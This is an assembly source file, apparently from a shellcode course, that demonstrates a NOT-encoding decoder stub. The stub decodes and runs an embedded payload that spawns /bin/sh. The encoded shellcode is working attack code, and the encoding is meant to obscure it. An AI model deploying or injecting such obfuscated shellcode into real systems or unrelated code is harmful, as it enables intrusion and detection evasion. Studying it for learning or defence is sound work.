; File: decoder.nasm
; Author: Kevin Ren, originally professor Viviek
; Purpose: to demostrate a shellcode that decodes and passes control to NOT encoded shellcode


global _start

section .text
_start:
	jmp short call_decoder			; initiate jmp call pop technique
decoder:
	pop esi					; address of shellcode is now popped from the stack and loaded in esi
	xor ecx, ecx				; zeroing out ecx so we can put counter for loop
	mov cl, 25

decode: 
	not byte [esi]				; decode each byte of shellcode, storing result at the same location
	inc esi					; increment esi to the next byte position for the next loop decode	
	loop decode				; loop ecx amount of times

	jmp short shellcode			; after all is decoded, pass control to decoded shellcode

call_decoder:
	call decoder				; loading shellcode address onto the stack
	shellcode: db 0xce,0x3f,0xaf,0x97,0x91,0xd0,0x8c,0x97,0x97,0xd0,0xd0,0x9d,0x96,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f 
